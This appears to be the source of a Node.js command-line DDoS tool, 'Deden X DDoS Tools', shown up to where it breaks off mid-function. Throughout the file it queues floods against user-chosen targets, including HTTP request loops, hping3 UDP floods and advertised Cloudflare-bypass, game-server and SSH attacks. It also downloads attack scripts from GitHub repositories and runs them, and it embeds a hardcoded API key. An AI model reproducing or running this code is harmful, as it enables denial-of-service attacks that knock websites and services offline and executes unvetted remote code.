#!/usr/bin/env node

const { exec, spawn, fork } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const util = require('util')
const os = require('os')
const execPromise = util.promisify(exec)
const crypto = require('crypto')

const version = '5.1.7'
let processList = [];
let attackQueue = [];
let isProcessing = false;
const maxConcurrent = 3;
const attackLogs = [];

// [========================================] //
// AUTO CREATE DIRECTORIES
// [========================================] //
const dirs = [
  './lib',
  './lib/cache',
  './data',
  './logs',
  './config'
]

dirs.forEach(dir => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true })
  }
})

// [========================================] //
// CHECK ENVIRONMENT
// [========================================] //
const isTermux = fs.existsSync('/data/data/com.termux')
const isRoot = process.getuid && process.getuid() === 0
const platform = os.platform()
const totalMemory = os.totalmem()
const freeMemory = os.freemem()

// [========================================] //
// CONFIGURATION
// [========================================] //
const configPath = path.join(__dirname, 'config/settings.json')
let config = {
  autoDownload: true,
  maxConcurrent: 3,
  saveLogs: true,
  defaultPassword: 'admin',
  offlineMode: false,
  apiKeys: {
    ipgeo: '8fd0a436e74f44a7a3f94edcdd71c696'
  }
}

if (fs.existsSync(configPath)) {
  try {
    config = { ...config, ...JSON.parse(fs.readFileSync(configPath, 'utf8')) }
  } catch (e) {}
}

// [========================================] //
const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

// [========================================] //
// UTILITY FUNCTIONS
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function log(message, type = 'INFO') {
  const timestamp = new Date().toISOString()
  const logMessage = `[${timestamp}] [${type}] ${message}`
  
  console.log(logMessage)
  
  if (config.saveLogs) {
    fs.appendFileSync('logs/attack.log', logMessage + '\n')
  }
}

function generateSessionId() {
  return crypto.randomBytes(16).toString('hex')
}

function checkSystemResources() {
  const used = process.memoryUsage()
  log(`Memory: ${Math.round(used.heapUsed / 1024 / 1024)}MB / ${Math.round(totalMemory / 1024 / 1024 / 1024)}GB`)
  
  if (used.heapUsed > totalMemory * 0.8) {
    log('⚠️ Memory usage high, cleaning up...', 'WARN')
    global.gc && global.gc()
  }
}

// [========================================] //
// ASCII ART BANNER DENGAN LABALABA
// [========================================] //
async function banner() {
console.clear()
console.log(`
 ❍=============================================❍
       \x1b[38;5;88m🔥𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘵𝘰 Deden 𝘟 𝘋dos 𝘛𝘰𝘭𝘭𝘴🔥
❍=============================================❍
\x1b[31m               ⢀⣠⠤⠶⣷⠲⠤⣄⡀             \x1b[0m
\x1b[31m            ⢀⣤⠞⢉   ⠿⠦⠤⢦⣍⠲⣄           \x1b[0m
\x1b[31m         ⣠⡤⣤⡞⢡⡶⠋         ⠈⢧          \x1b[0m
\x1b[31m ⢀⣤⠴⠒⣾⠿⢟⠛⠻⣿⡿⣭⠿⠁⢰⠰   ⠄⣄⣀⡀  ⠘⣇         \x1b[0m
\x1b[31m⢰⣿⣿⣦⡀⠙⠛⠋  ⠉⠻⠿⢷⣦⣿⣤⣤⣤⣤⣀⣈⠉⠛⠽⣆⡒⣿⣯⣷⣄      \x1b[0m
\x1b[31m ⠻⣍⠻⠿⣿⣦⣄⡀⢠⣾⠑⡆ ⠈⠉⠛⠛⢿⡿⠿⠿⢿⣿⣿⣿⣿⠟⠉⠉⢿⣟⢲⢦⣀  \x1b[0m
\x1b[36m  ⠈⠙⠲⢤⣈⠉⠛⠷⢿⣏⣀⡀   ⢰⣏⣳     ⣸⣓⣦  ⠈⠛⠟⠃⣈⣷⡀\x1b[0m
\x1b[36m     ⠈⢿⣙⡓⣶⣤⣤⣀⡀   ⠈⠛⠁     ⠹⣿⣯⣤⣶⣶⣶⣿⠘⡿⢸⡿\x1b[0m
\x1b[36m       ⠙⠻⣿⡛⠻⢿⣯⣽⣷⣶⣶⣤⣤⣤⣤⣄⣀⣀⢀⣀⢀⣀⣈⣥⡤⠶⠗⠛⠋ \x1b[0m
\x1b[36m          ⠉⠓⠲⣬⣍⣉⡉⠙⠛⠛⠛⠉⠙⠉⠙⠉⣹⣿⠿⠛⠁      \x1b[0m
\x1b[36m                ⠉⠉⠉⠻⠗⠒⠒⠚⠋⠉⠁          \x1b[0m
=======================================================\x1b[31m| \x1b[34mUser: \x1b[32mRoot \x1b[31m| \x1b[34mVip: \x1b[32mVip \x1b[31m|\x1b[34mExperid:\x1b[32m No Expired\x1b[31m | \x1b[34mTime Limit: \x1b[32m No Limited 
\x1b[31m| \x1b[36mDEFFA X DDOS Tools 2025-2026 \x1b[31m| \x1b[36mt.me/DEFFA568
❍=============================================❍
           𝙳𝙴𝙳𝙴𝙽 𝚇 𝙳𝙳𝙾𝚂 𝙸𝙽𝙵𝙸𝙽𝙸𝚃𝚈
❍=============================================❍
========================================================================
`)
log(`Environment: ${platform} | Termux: ${isTermux} | Root: ${isRoot}`, 'SYS')
log(`Memory: ${Math.round(freeMemory / 1024 / 1024)}MB free`, 'SYS')
}

// [========================================] //
// CREDIT BY DEDEN - SPECIAL SECTION
// [========================================] //
function showDedenCredit() {
  console.log(`
╔════════════════════════════════════════════════════════════════╗
║                    🕷️  CREDIT BY DEDEN 🕷️                      ║
╠════════════════════════════════════════════════════════════════╣
║                                                               ║
║     ██████╗ ███████╗██████╗ ███████╗███╗   ██╗               ║
║     ██╔══██╗██╔════╝██╔══██╗██╔════╝████╗  ██║               ║
║     ██║  ██║█████╗  ██████╔╝█████╗  ██╔██╗ ██║               ║
║     ██║  ██║██╔══╝  ██╔══██╗██╔══╝  ██║╚██╗██║               ║
║     ██████╔╝███████╗██████╔╝███████╗██║ ╚████║               ║
║     ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝               ║
║                                                               ║
║  ╔══════════════════════════════════════════════════════════╗ ║
║  ║                 🏆 MASTER OF DDOS 🏆                     ║ ║
║  ╚══════════════════════════════════════════════════════════╝ ║
║                                                               ║
║  ✨ CREATOR:                                                  ║
║  █▀▀ █▀▀█ █▀▀█ █▀▀ █─█ █▀▀    █▀▀ █▀▀█ █▀▀█ █▀▀ █▀▀█        ║
║  █── █▄▄█ █──█ █── █▀▄ █▀▀    █── █──█ █──█ █── █▄▄█        ║
║  ▀▀▀ ▀──▀ █▀▀▀ ▀▀▀ ▀─▀ ▀▀▀    ▀▀▀ ▀▀▀▀ █▀▀▀ ▀▀▀ ▀──▀        ║
║                                                               ║
║  🌟 CONTRIBUTIONS:                                            ║
║  ├─ 🚀 Original DDoS Engine                                  ║
║  ├─ 🔥 Method Development                                    ║
║  ├─ 💻 Core Architecture                                     ║
║  ├─ 🛡️ Bypass Techniques                                     ║
║  └─ 🌐 Proxy Integration                                     ║
║                                                               ║
║  ╔══════════════════════════════════════════════════════════╗ ║
║  ║              "Code Is Poetry, DDoS Is Art"               ║ ║
║  ╚══════════════════════════════════════════════════════════╝ ║
║                                                               ║
║  📱 DEV: t.me/TheDeden                                   ║
║  🕷️  VERSION: ${version}                                          ║
║  🎯 STATUS: ACTIVE 🟢                                        ║
║                                                               ║
╚════════════════════════════════════════════════════════════════╝
`)
}

// [========================================] //
// METHOD MANAGEMENT
// [========================================] //
const methodList = [
  'flood', 'tls', 'vip', 'hyper', 'imut', 'ninja', 'overload', 'strike',
  'kill', 'xp-net', 'guardresponder', 'icmpflood', 'xp-hold', 'z-sky',
  'sky', 'attackpanel', 'behind-cloudflare', 'netsecure', 'raw', 'bypass',
  'ddosbydeden', 'bomba', 'boti', 'brow', 'god', 'glory', 'bypassbydeden',
  'ddoswebbydeden', 'ddos11', 'cookie', 'deffa', 'h2-hold', 'cyn',
  'attackpanelcombo', 'flood1', 'floodv2', 'floodapi', 'flaying-raw',
  'clasic', 'cibi', 'blast', 'cfgood', 'cipca', 'cars', 'ciko', 'rawi',
  'speed', 'browser', 'thunder', 'storm', 'rape', 'java', 'kikaz',
  'killpingnew', 'nuke', 'pluto', 'random', 'destroy', 'combo',
  'cloudflare', 'slim'
]

const builtInMethods = {
  ping: (target, duration) => {
    return new Promise((resolve) => {
      const count = Math.min(duration, 100)
      const ping = spawn('ping', [isTermux ? '-c' : '-n', count.toString(), target])
      
      ping.stdout.on('data', (data) => {
        log(`[PING] ${data.toString().trim()}`)
      })
      
      setTimeout(resolve, duration * 1000)
    })
  },
  
  http: async (target, duration) => {
    const endTime = Date.now() + (duration * 1000)
    let requests = 0
    
    while (Date.now() < endTime) {
      try {
        await axios.get(target, { timeout: 5000 })
        requests++
      } catch (e) {}
    }
    
    log(`[HTTP] Completed ${requests} requests`)
  },
  
  udp: (target, port, duration) => {
    return new Promise((resolve) => {
      if (!isRoot) {
        log('⚠️ UDP flood needs root!', 'WARN')
      }
      
      const hping = spawn('hping3', ['--udp', '-p', port.toString(), '--flood', target])
      
      setTimeout(() => {
        hping.kill()
        resolve()
      }, duration * 1000)
    })
  }
}

async function checkMethodFile(methods) {
  const metodePath = path.join(__dirname, `lib/cache/${methods}`)
  return fs.existsSync(metodePath)
}

async function downloadMethod(methods) {
  if (!config.autoDownload) {
    log(`Auto download disabled for ${methods}`, 'WARN')
    return false
  }
  
  log(`Downloading method ${methods}...`, 'INFO')
  
  const sources = [
    `https://raw.githubusercontent.com/Deden-cloud/ddosdeden/main/lib/cache/${methods}`,
    `https://raw.githubusercontent.com/permenmd/cache/main/methods/${methods}`,
    `https://raw.githubusercontent.com/rafael453322/PROXYDT/main/methods/${methods}`
  ]
  
  for (const source of sources) {
    try {
      const response = await axios.get(source, {
        responseType: 'arraybuffer',
        timeout: 10000
      })
      
      fs.writeFileSync(`lib/cache/${methods}`, response.data)
      fs.chmodSync(`lib/cache/${methods}`, '755')
      log(`✅ Method ${methods} downloaded from ${source}`, 'SUCCESS')
      return true
    } catch (error) {
      log(`Failed from ${source}: ${error.message}`, 'DEBUG')
    }
  }
  
  const dummyContent = `#!/usr/bin/env node
console.log('${methods} method - simulation mode');
console.log('Target:', process.argv[2]);
console.log('Duration:', process.argv[3]);
console.log('Running in simulation mode...');
`
  fs.writeFileSync(`lib/cache/${methods}`, dummyContent)
  fs.chmodSync(`lib/cache/${methods}`, '755')
  log(`Created dummy method for ${methods}`, 'WARN')
  
  return false
}

// [========================================] //
// ALL MENU FUNCTION
// [========================================] //
async function showAllMenu() {
  console.log(`
╔════════════════════════════════════════════════════════════════╗
║                    ✧ DEDEN X DDOS TOOLS ✧                      ║
║                    🕷️  ALL MENU / COMMANDS  🕷️                 ║
╠════════════════════════════════════════════════════════════════╣
║                                                               ║
║  🎯 ATTACK METHODS                     ║
║  ├─ attack <url> <time> <method>     - Launch DDoS attack    ║
║  ├─ methods                           - List all methods     ║
║  ├─ ongoing                           - Show active attacks  ║
║  ├─ queue                              - Show attack queue    ║
║  └─ status                             - System status        ║
║                                                               ║
║  🌐 NETWORK TOOLS                      ║
║  ├─ track-ip <ip>                      - Track IP address     ║
║  ├─ subdo-finder <domain>              - Find subdomains      ║
║  ├─ udp-raw <ip> <port> <time>         - UDP flood attack     ║
║  ├─ xp-pps <ip> <port> <time>          - High PPS attack      ║
║  ├─ kill-ping <ip> <time>               - Death pinger        ║
║  └─ kill-wifi                           - WiFi killer         ║
║                                                               ║
║  🎮 GAME ATTACKS                        ║
║  ├─ mc-flood <ip> <port> <time>         - Minecraft flood     ║
║  └─ samp <ip> <port> <time>             - SAMP flood          ║
║                                                               ║
║  💣 SPECIAL ATTACKS                      ║
║  ├─ kill-ssh <ip> <time>                 - SSH killer         ║
║  ├─ kill-otp <number> <time>             - OTP spammer        ║
║  └─ kill-do <ip> <time>                   - DigitalOcean killer║
║                                                               ║
║  🤖 OTHER FEATURES                       ║
║  ├─ ai                                    - Chat with AI      ║
║  ├─ logs                                  - View attack logs  ║
║  ├─ update                                - Update methods    ║
║  ├─ clear                                 - Clear temp files  ║
║  ├─ cls                                   - Clear screen      ║
║  ├─ deden                                 - Show Deden credit ║
║  ├─ credits                               - Show all credits  ║
║  └─ exit                                  - Exit tools        ║
║                                                               ║
╠════════════════════════════════════════════════════════════════╣
║  🔥 TOTAL METHODS: ${methodList.length + 6} | ACTIVE: ${processList.length}/${maxConcurrent} 🔥         ║
║  🕷️  CREDIT BY:DEDEN 🕷️           ║
╚════════════════════════════════════════════════════════════════╝
`)
}

async function showMethods() {
  console.log(`
╔══════════════════════════════════════════════╗
║           AVAILABLE METHODS                  ║
╠══════════════════════════════════════════════╣`)

  const categories = {
    'LAYER 7': ['flood', 'tls', 'http', 'https', 'browser', 'vip', 'hyper', 'imut'],
    'BYPASS': ['bypass', 'cloudflare', 'cfgood', 'behind-cloudflare', 'combo', 'xp-cf'],
    'LAYER 4': ['udp-raw', 'icmpflood', 'kill-ping', 'xp-pps', 'xp-hold', 'xp-net'],
    'GAME': ['mc-flood', 'samp', 'minecraft', 'boti'],
    'SPECIAL': ['kill-ssh', 'kill-otp', 'kill-do', 'kill-wifi', 'raw'],
    'PREMIUM': ['ninja', 'overload', 'strike', 'thunder', 'storm', 'rape', 'destroy', 'slim'],
    'OTHER': methodList.filter(m => !['flood','tls','http','https','browser','vip','hyper','imut','bypass','cloudflare','cfgood','behind-cloudflare','combo','xp-cf','udp-raw','icmpflood','kill-ping','xp-pps','xp-hold','xp-net','mc-flood','samp','minecraft','boti','kill-ssh','kill-otp','kill-do','kill-wifi','raw','ninja','overload','strike','thunder','storm','rape','destroy','slim'].includes(m))
  }

  for (const [category, methods] of Object.entries(categories)) {
    if (methods.length > 0) {
      console.log(`║ [${category}]`)
      console.log(`║   ${methods.join(', ')}`)
    }
  }

  console.log(`╚══════════════════════════════════════════════╝`)
  console.log(`Total Methods: ${methodList.length + 6} (Created by Deden & Team)`)
}

// [========================================] //
// QUEUE SYSTEM
// [========================================] //
async function processQueue() {
  if (isProcessing) return
  if (attackQueue.length === 0) return
  
  isProcessing = true
  
  while (attackQueue.length > 0 && processList.length < maxConcurrent) {
    const attack = attackQueue.shift()
    await executeAttackWithLimit(attack)
  }
  
  isProcessing = false
}

async function executeAttackWithLimit(attack) {
  const { metode, args, target, methods, duration } = attack
  
  if (processList.length >= maxConcurrent) {
    attackQueue.push(attack)
    log(`Attack queued (${processList.length}/${maxConcurrent} active)`, 'QUEUE')
    return
  }
  
  pushOngoing(target, methods, duration)
  
  try {
    if (fs.existsSync(metode)) {
      const child = fork(metode, args, {
        stdio: 'pipe',
        detached: false
      })
      
      child.on('error', (err) => {
        log(`Attack error: ${err.message}`, 'ERROR')
        useBuiltInFallback(attack)
      })
      
      child.on('exit', (code) => {
        log(`Attack completed with code ${code}`, 'INFO')
        removeFromOngoing(methods)
        processQueue()
      })
      
      log(`Attack started: ${target} (${methods})`, 'ATTACK')
      
    } else {
      useBuiltInFallback(attack)
    }
  } catch (error) {
    log(`Attack failed: ${error.message}`, 'ERROR')
    useBuiltInFallback(attack)
  }
}

async function useBuiltInFallback(attack) {
  const { target, duration, methods, args } = attack
  
  log(`Using built-in fallback for ${methods}`, 'FALLBACK')
  
  if (methods.includes('ping') || args[1] === '22') {
    await builtInMethods.ping(target, duration)
  } else if (target.startsWith('http')) {
    await builtInMethods.http(target, duration)
  } else if (args[1] && !isNaN(args[1])) {
    await builtInMethods.udp(target, args[1], duration)
  } else {
    log(`No fallback for ${methods}, simulating...`, 'WARN')
    await sleep(duration * 1000)
  }
  
  removeFromOngoing(methods)
  processQueue()
}

function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  const sessionId = generateSessionId()
  processList.push({ target, methods, startTime, duration, sessionId })
  
  attackLogs.push({
    sessionId,
    target,
    methods,
    duration,
    startTime,
    status: 'started'
  })
}

function removeFromOngoing(methods) {
  const index = processList.findIndex((p) => p.methods === methods);
  if (index !== -1) {
    const attack = processList[index]
    attackLogs.push({
      ...attack,
      endTime: Date.now(),
      status: 'completed'
    })
    processList.splice(index, 1);
  }
}

// [========================================] //
// AUTO CLEANUP
// [========================================] //
setInterval(() => {
  const now = Date.now()
  const before = processList.length
  
  processList = processList.filter(p => {
    return (now - p.startTime) < p.duration * 1000
  })
  
  if (before !== processList.length) {
    log(`Cleaned up ${before - processList.length} expired attacks`, 'CLEAN')
  }
  
  checkSystemResources()
}, 30000)

// [========================================] //
// BOOTUP
// [========================================] //
async function installDependencies() {
  log('Installing dependencies...', 'SETUP')
  
  const deps = [
    'axios', 'child_process', 'readline', 'url', 
    'fs', 'path', 'util', 'os', 'crypto'
  ]
  
  try {
    if (!fs.existsSync('node_modules')) {
      await execPromise('npm init -y')
      await execPromise('npm install ' + deps.join(' '))
    }
    log('✅ Dependencies installed', 'SUCCESS')
    return true
  } catch (error) {
    log('❌ Failed to install dependencies: ' + error.message, 'ERROR')
    return false
  }
}

async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/Deden-cloud/ddosdeden/refs/heads/main/ui.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
    log('✅ Proxy list updated', 'SUCCESS')
  } catch (error) {
    log(`Error fetching proxy: ${error.message}`, 'ERROR')
    if (!fs.existsSync('proxy.txt')) {
      fs.writeFileSync('proxy.txt', '127.0.0.1:8080\n', 'utf-8');
    }
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/rafael453322/PROXYDT/main/proxy.json.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
    log('✅ User agent list updated', 'SUCCESS')
  } catch (error) {
    log(`Error fetching user agent: ${error.message}`, 'ERROR')
    if (!fs.existsSync('ua.txt')) {
      fs.writeFileSync('ua.txt', 'Mozilla/5.0\n', 'utf-8');
    }
  }
}

// [========================================] //
// COMMAND FUNCTIONS
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    return sigma()
  }
  
  const [target] = args
  
  try {
    log(`Tracking IP: ${target}`, 'INFO')
    
    let ipInfo = {}
    let additionalInfo = {}
    
    try {
      const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${config.apiKeys.ipgeo}&ip=${target}`);
      ipInfo = await response.json();
    } catch (e) {
      log('Primary API failed, trying backup...', 'WARN')
      const response = await fetch(`http://ip-api.com/json/${target}`);
      ipInfo = await response.json();
    }
    
    try {
      const res = await fetch(`https://ipwho.is/${target}`);
      additionalInfo = await res.json();
    } catch (e) {}

    console.clear()
    console.log(`
╔══════════════════════════════════════════════╗
║           IP TRACKING RESULT                 ║
╠══════════════════════════════════════════════╣
║ IP Address  : ${target}
║ Country     : ${ipInfo.country_name || ipInfo.country || 'N/A'}
║ City        : ${ipInfo.city || 'N/A'}
║ ISP         : ${ipInfo.isp || 'N/A'}
║ Organization: ${ipInfo.organization || ipInfo.org || 'N/A'}
║ Latitude    : ${ipInfo.latitude || ipInfo.lat || 'N/A'}
║ Longitude   : ${ipInfo.longitude || ipInfo.lon || 'N/A'}
║ Timezone    : ${ipInfo.timezone || ipInfo.timezone || 'N/A'}
╚══════════════════════════════════════════════╝
`)
  } catch (error) {
    log(`Error Tracking ${target}: ${error.message}`, 'ERROR')
  }
  sigma()
}

async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    return sigma()
  }
  
  const [target, duration, methods] = args
  
  try {
    if (!target.startsWith('http')) {
      new URL(`http://${target}`)
    } else {
      new URL(target)
    }
  } catch {
    log('Invalid target URL/IP', 'ERROR')
    return sigma()
  }
  
  const dur = parseInt(duration)
  if (isNaN(dur) || dur < 1) {
    log('Invalid duration', 'ERROR')
    return sigma()
  }
  
  const metode = path.join(__dirname, `lib/cache/${methods}`)
  
  if (!fs.existsSync(metode) && !builtInMethods[methods]) {
    log(`Method ${methods} not found`, 'WARN')
    const answer = await new Promise(resolve => {
      permen.question('Download method? (y/n): ', resolve)
    })
    
    if (answer.toLowerCase() === 'y') {
      await downloadMethod(methods)
    } else {
      log('Attack cancelled', 'INFO')
      return sigma()
    }
  }
  
  try {
    const hostname = target.replace('http://', '').replace('https://', '').split('/')[0]
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`, { timeout: 5000 })
    const result = scrape.data;

    console.clear()
    console.log(`
╔══════════════════════════════════════════════╗
║           ATTACK LAUNCHED                     ║
╠══════════════════════════════════════════════╣
║ Target   : ${target}
║ Duration : ${duration} seconds
║ Methods  : ${methods}
║ ISP      : ${result.isp || 'Unknown'}
║ IP       : ${result.query || hostname}
║ AS       : ${result.as || 'Unknown'}
║ Status   : Queued / Running
╚══════════════════════════════════════════════╝
`)
  } catch (error) {
    log(`Could not fetch target info: ${error.message}`, 'WARN')
  }
  
  attackQueue.push({
    metode,
    args: [target, duration, ...args.slice(3)],
    target,
    methods,
    duration: dur
  })
  
  log(`Attack queued (${attackQueue.length} waiting)`, 'QUEUE')
  processQueue()
  sigma()
}

async function showStatus() {
  console.log(`
╔══════════════════════════════════════════════╗
║           SYSTEM STATUS                       ║
╠══════════════════════════════════════════════╣
║ Active Attacks : ${processList.length}/${maxConcurrent}
║ Queued Attacks : ${attackQueue.length}
║ Total Logs     : ${attackLogs.length}
║ Platform       : ${platform}
║ Termux         : ${isTermux ? 'Yes' : 'No'}
║ Root Access    : ${isRoot ? 'Yes' : 'No'}
║ Memory Free    : ${Math.round(freeMemory / 1024 / 1024)}MB
╚══════════════════════════════════════════════╝
`)

  if (processList.length > 0) {
    console.log('\nOngoing Attacks:')
    processList.forEach((p, i) => {
      const elapsed = Math.floor((Date.now() - p.startTime) / 1000)
      const remaining = p.duration - elapsed
      console.log(`${i+1}. ${p.target} | ${p.methods} | ${remaining}s remaining`)
    })
  }
  
  sigma()
}

async function showLogs() {
  if (attackLogs.length === 0) {
    console.log('No logs available')
  } else {
    console.log('\nLast 10 Attacks:')
    attackLogs.slice(-10).forEach((log, i) => {
      const date = new Date(log.startTime).toLocaleTimeString()
      console.log(`${i+1}. [${date}] ${log.target} | ${log.methods} | ${log.status}`)
    })
  }
  sigma()
}

async function clearAll() {
  processList.forEach(p => {
    try { process.kill(p.pid) } catch {}
  })
  
  processList = []
  attackQueue = []
  
  const tempFiles = ['proxy.txt', 'ua.txt', 'logs/attack.log']
  tempFiles.forEach(f => {
    if (fs.existsSync(f)) fs.unlinkSync(f)
  })
  
  log('All cleared', 'INFO')
  sigma()
}

async function updateMethods() {
  log('Updating all methods...', 'INFO')
  let success = 0
  for (const method of methodList) {
    if (await downloadMethod(method)) success++
    await sleep(100)
  }
  log(`Updated ${success}/${methodList.length} methods`, 'INFO')
  sigma()
}

// [========================================] //
// KILL FUNCTIONS
// [========================================] //
async function pod(args) {
  if (args.length < 2) {
    console.log('Usage: kill-ping <target> <duration>')
    return sigma()
  }
  
  const [target, duration] = args
  log(`Starting ping flood to ${target} for ${duration}s`, 'ATTACK')
  
  attackQueue.push({
    metode: 'builtin',
    args: [target, duration],
    target,
    methods: 'ping',
    duration: parseInt(duration)
  })
  
  processQueue()
  sigma()
}

async function killSSH(args) {
  if (args.length < 2) {
    console.log('Usage: kill-ssh <target> <duration>')
    return sigma()
  }
  
  const [target, duration] = args
  log(`Starting SSH attack to ${target} for ${duration}s`, 'ATTACK')
  
  attackQueue.push({
    metode: 'builtin',
    args: [target, duration],
    target,
    methods: 'ssh',
    duration: parseInt(duration)
  })
  
  processQueue()
  sigma()
}

async function killOTP(args) {
  if (args.length < 2) {
    console.log('Usage: kill-otp <number> <duration>')
    return sigma()
  }
  
  log(`OTP spammer - Feature in development`, 'WARN')
  sigma()
}

async function killWifi() {
  log('WiFi killer - Starting...', 'ATTACK')
  
  if (isTermux) {
    try {
      await execPromise('termux-wifi-enable false')
      setTimeout(async () => {
        await execPromise('termux-wifi-enable true')
      }, 10000)
    } catch {
      log('WiFi killer failed - need Termux:API', 'ERROR')
    }
  } else {
    log('WiFi killer only works on Termux', 'WARN')
  }
  
  sigma()
}

async function udp_flood(args) {
  if (args.length < 3) {
    console.log('Usage: udp-raw <target> <port> <duration>')
    return sigma()
  }
  
  const [target, port, duration] = args
  log(`Starting UDP flood to ${target}:${port}`, 'ATTACK')
  
  attackQueue.push({
    metode: 'builtin',
    args: [target, port, duration],
    target,
    methods: 'udp',
    duration: parseInt(duration)
  })
  
  processQueue()
  sigma()
}

async function xp_pps(args) {
  if (args.length < 3) {
    console.log('Usage: xp-pps <target> <port> <duration>')
    return sigma()
  }
  log('XP-PPS attack - High performance mode', 'ATTACK')
  udp_flood(args)
}

async function mcbot(args) {
  if (args.length < 3) {
    console.log('Usage: mc-flood <target> <port> <duration>')
    return sigma()
  }
  log('Minecraft flood - Bypass mode active', 'ATTACK')
  udp_flood(args)
}

async function samp(args) {
  if (args.length < 3) {
    console.log('Usage: samp <target> <port> <duration>')
    return sigma()
  }
  log('SAMP flood - Game server attack', 'ATTACK')
  udp_flood(args)
}

async function subdomen(args) {
  if (args.length < 1) {
    console.log('Usage: subdo-finder <domain>')
    return sigma()
  }
  
  const [domain] = args
  log(`Finding subdomains for ${domain}...`, 'INFO')
  
  try {
    const response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`)
    const subdomains = response.data.data || []
    
    console.log(`\nFound ${subdomains.length} subdomains:`)
    subdomains.slice(0, 20).forEach((sub, i) => {
      console.log(`${i+1}. ${sub}`)
    })
    
    if (subdomains.length > 20) {
      console.log(`... and ${subdomains.length - 20} more`)
    }
  } catch (error) {
    log(`Error: ${error.message}`, 'ERROR')
  }
  
  sigma()
}

async function chat_ai() {
  permen.question('[You]: ', async (msg) => {
    if (msg === 'exit') {
      log('Chat ended', 'INFO')
      return sigma()
    }
    
    try {
      const response = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${encodeURIComponent(msg)}`)
      console.log(`[AI]: ${response.data.data || 'No response'}`)
    } catch {
      console.log('[AI]: Maaf, saya sedang offline')
    }
    
    chat_ai()
  })
}

function showCredits() {
  console.log(`
╔════════════════════════════════════════════════════════════════╗
║               🕷️  ALL CREDITS & TEAM 🕷️                        ║
╠════════════════════════════════════════════════════════════════╣
║                                                               ║
║  ╔══════════════════════════════════════════════════════════╗ ║
║  ║                🏆 MASTER MIND 🏆                         ║ ║
║  ╚══════════════════════════════════════════════════════════╝ ║
║                                                               ║
║  ██████╗ ███████╗██████╗ ███████╗███╗   ██╗                ║
║  ██╔══██╗██╔════╝██╔══██╗██╔════╝████╗  ██║                ║
║  ██║  ██║█████╗  ██████╔╝█████╗  ██╔██╗ ██║                ║
║  ██║  ██║██╔══╝  ██╔══██╗██╔══╝  ██║╚██╗██║                ║
║  ██████╔╝███████╗██████╔╝███████╗██║ ╚████║                ║
║  ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝                ║
║                                                               ║
║  ╔══════════════════════════════════════════════════════════╗ ║
║  ║              👑 CORE DEVELOPERS 👑                       ║ ║
║  ╚══════════════════════════════════════════════════════════╝ ║
║                                                               ║
║  🔥 DEDEN                                                      ║
║     ├─ Role  : Lead Developer & Founder                       ║
║     ├─ Contributed: Original Engine, Methods, Core Code      ║
║     ├─ Status : Active 🟢                                     ║
║     └─ Contact: t.me/TheDeden                                 ║
║                                                               ║
║  ⚡ DEFFA                                                      ║
║     ├─ Role  : Co-Developer & Tester                          ║
║     ├─ Contributed: Bug Fixes, Updates, Features             ║
║     ├─ Status : Active 🟢                                     ║
║     └─ Contact: t.me/DEFFA568                                 ║
║                                                               ║
║  ╔══════════════════════════════════════════════════════════╗ ║
║  ║              🌟 CONTRIBUTORS 🌟                           ║ ║
║  ╚══════════════════════════════════════════════════════════╝ ║
║                                                               ║
║  🛡️  DAVIANT                                                   ║
║     ├─ Security Specialist                                    ║
║     └─ Bypass Techniques                                      ║
║                                                               ║
║  ⚙️  DAPZY                                                     ║
║     ├─ Method Developer                                       ║
║     └─ Performance Optimization                               ║
║                                                               ║
║  🎯 CIKY                                                       ║
║     ├─ Tester & Debugger                                      ║
║     └─ UI/UX Improvements                                     ║
║                                                               ║
║  ╔══════════════════════════════════════════════════════════╗ ║
║  ║              🤝 ALL PARTNERS 🤝                           ║ ║
║  ╚══════════════════════════════════════════════════════════╝ ║
║                                                               ║
║  • Floid Team                                              ║
║  • StarsX Crew                                               ║
║  • DenOffc Family                                           ║
║  • Indonesian Cyber Security                                 ║
║  • All Supporters & Users                                    ║
║                                                               ║
║  ╔══════════════════════════════════════════════════════════╗ ║
║  ║              📊 PROJECT STATS 📊                          ║ ║
║  ╚══════════════════════════════════════════════════════════╝ ║
║                                                               ║
║  🕷️  Version    : ${version}                                          ║
║  📅 Released   : 2025-2026                                   ║
║  🎯 Methods    : ${methodList.length + 6}+                                    ║
║  🌐 Channel    : t.me/dedenampas17                               ║
║  💬 Status     : Active & Updated                            ║
║                                                               ║
║  ╔══════════════════════════════════════════════════════════╗ ║
║  ║           "Together We Stand, Divided We Fall"           ║ ║
║  ╚══════════════════════════════════════════════════════════╝ ║
║                                                               ║
╚════════════════════════════════════════════════════════════════╝
`)
}

// [========================================] //
// MAIN LOOP
// [========================================] //
async function sigma() {
  permen.question('[\x1b[1m\x1b[32mDeden Console\x1b[0m]: ', (input) => {
    const [command, ...args] = input.trim().split(/\s+/);

    const commands = {
      'help': () => {
        showAllMenu()
        sigma()
      },
      
      'menu': () => {
        showAllMenu()
        sigma()
      },
      
      'methods': () => {
        showMethods()
        sigma()
      },
      
      'attack': () => handleAttackCommand(args),
      
      'track-ip': () => trackIP(args),
      
      'status': () => showStatus(),
      
      'ongoing': () => {
        if (processList.length === 0) {
          console.log('No ongoing attacks')
        } else {
          console.log('\n🕷️  ONGOING ATTACKS:')
          processList.forEach((p, i) => {
            const elapsed = Math.floor((Date.now() - p.startTime) / 1000)
